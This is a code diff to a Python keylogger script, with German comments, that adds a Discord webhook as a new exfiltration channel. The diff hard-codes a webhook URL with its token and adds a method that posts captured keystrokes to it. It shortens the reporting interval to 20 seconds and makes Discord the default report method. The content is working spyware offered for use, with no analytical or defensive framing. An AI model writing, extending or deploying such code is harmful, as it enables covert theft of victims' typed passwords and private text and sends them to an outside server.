@@ -3,10 +3,12 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+import requests  # Für Discord-Webhook
 
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "YOUREMAIL"
-EMAIL_PASSWORD = "YOURPASSWORD"
+SEND_REPORT_EVERY = 20 # in seconds, 60 means 1 minute and so on
+EMAIL_ADDRESS = "deine.email@gmail.com"  # Ersetze mit deiner Gmail-Adresse
+EMAIL_PASSWORD = "dein-app-passwort"  # Ersetze mit deinem Gmail-App-Passwort (nicht dem normalen Passwort)
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1433066545784819736/abmFKt0qVERXl8Xh5KDbG80VLchYp1Xtoll7y9XKFj8B9ynQPPt8CLUPSHSUx6fXKzBX"  # Ersetze mit deiner Webhook-URL
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -71,6 +73,14 @@ class Keylogger:
         # terminates the session
         server.quit()
 
+    def send_to_discord_webhook(self, message):
+        data = {"content": message}
+        try:
+            requests.post(DISCORD_WEBHOOK_URL, json=data)
+            print("[+] Sent to Discord Webhook")
+        except Exception as e:
+            print(f"[-] Failed to send to Discord Webhook: {e}")
+
     def report(self):
         """
         This function gets called every `self.interval`
@@ -85,6 +95,8 @@ class Keylogger:
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log.encode('ascii', 'ignore').decode('ascii'))
             elif self.report_method == "file":
                 self.report_to_file()
+            elif self.report_method == "discord":
+                self.send_to_discord_webhook(self.log)
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -112,5 +124,5 @@ if __name__ == "__main__":
     # if you want a keylogger to record keylogs to a local file
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="discord") # Hier "email", "file" oder "discord" setzen
     keylogger.start()
